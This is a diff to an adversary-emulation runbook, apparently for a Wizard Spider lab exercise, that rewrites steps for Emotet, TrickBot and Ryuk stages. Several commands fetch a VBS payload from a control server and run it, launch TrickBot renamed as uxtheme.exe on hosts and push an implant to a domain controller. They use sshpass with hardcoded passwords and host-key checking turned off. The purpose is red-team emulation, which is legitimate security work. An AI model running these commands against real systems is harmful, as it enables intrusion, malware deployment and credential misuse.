@@ -39,15 +39,14 @@ Start the control server from your EL machine.
 cd ~/wizard_spider/Resources/control_server
 sudo ./controlServer
 ```
-TODO: need passwords
 
 SSH into Dorothy / 10.0.0.7 as user Judy:
 ```bash
-ssh  judy@oz.local@10.0.0.7 'powershell.exe -Command "Invoke-WebRequest -Uri http://192.168.0.4:8080/getFile/adb.txt -OutFile $env:AppData\adb.vbs"'
+sshpass -p"Passw0rd!" ssh  judy@10.0.0.7 -oStrictHostkeyChecking=no 'powershell.exe -Command "Invoke-WebRequest -Uri http://192.168.0.4:8080/getFile/adb.txt -OutFile C:\\Users\\judy\\adb.vbs"'
 ```
 
 ```bash
-ssh  judy@oz.local@10.0.0.7 'powershell.exe -Command "cscript.exe $env:AppData\adb.vbs"'
+sshpass -p"Passw0rd!" ssh  judy@10.0.0.7 -oStrictHostkeyChecking=no 'powershell.exe -Command "cscript.exe C:\\Users\\judy\\adb.vbs"'
 ```
 
 ## Step 2 - Emotet Persistence
@@ -94,7 +93,7 @@ Enumerate processes.
 
 
 ```bash
-./evalsC2client.py --set-task DESKTOP-9IA6T0M_BA673852 "read C:\\Users\\local_user\\Desktop\\dont_share.txt"
+./evalsC2client.py --set-task DESKTOP-9IA6T0M_BA673852 "read C:\\Users\\Public\\Documents\\donotshare.txt"
 ```
 
 ## Step 4 - Move Laterally Deploy TrickBot
@@ -123,30 +122,18 @@ C2:	`192.168.0.4:447 HTTP - no encryption or obfuscation`
 
 ### ☣️ Procedures
 
-Change your RDP tab name to "RDP into Toto"
-
-RDP into Toto and create RDP drive that has TrickBot folder structure
-
-```bash
-# Wizard Spider has used RDP for lateral movement.[5][2][8]
-
-cd ~/
-xfreerdp +clipboard /u:oz\\bill /p:"Fall2021" /v:10.0.0.8 /drive:X,wizard_spider/Resources/TrickBot/WNetval
-```
-
 Open `CMD.exe` and copy file to bill's AppData\Roaming
 
 :warning: make sure you're in a `CMD` shell
 
 ```bash
-ssh bill@oz.local@10.0.0.8 'copy \\\\tsclient\\X\\TrickBotClientExe.exe %AppData%\\uxtheme.exe;cd %AppData%; uxtheme.exe'
+sshpass -pFall2021 scp -oStrictHostkeyChecking=no TrickBot/WNetval/TrickBotClientExe.exe bill@10.0.0.8:"C:\\Users\\bill\\uxtheme.exe"
 ```
 
  Kick off exeuction by starting TrickBotClientExe.exe
 
 ```bash
-cd %AppData%
-uxtheme.exe
+sshpass -pFall2021 ssh -oStrictHostkeyChecking=no bill@10.0.0.8 "C:\\Users\\bill\\uxtheme.exe"
 ```
 
 ## Step 5 - TrickBot Discovery
@@ -249,12 +236,11 @@ Value: `Userinit.exe, $env:AppData\uxtheme.exe`
 Ingress Jelly to the domain controller.
 
 ```bash
-scp /path/to/jelly vfleming@oz.local@10.0.0.4:"C:\Users\vfleming\."
-wizard_spider/Resources/Ryuk/bin
+sshpass -p q27VYN8xflPcYumbLMit scp /path/to/jelly vfleming@oz.local@10.0.0.4:"C:\Users\vfleming\."
 ```
 Execute Jelly on the domain controller.
 ```bash
-ssh vfleming@oz.local@10.0.0.4 'jelly start'
+sshpass -p q27VYN8xflPcYumbLMit ssh vfleming@oz.local@10.0.0.4 'C:\Users\vfleming\jelly.exe'
 ```
 Task Jelly to download a trickbot variant (same binary with a zero appended to the very end)
 
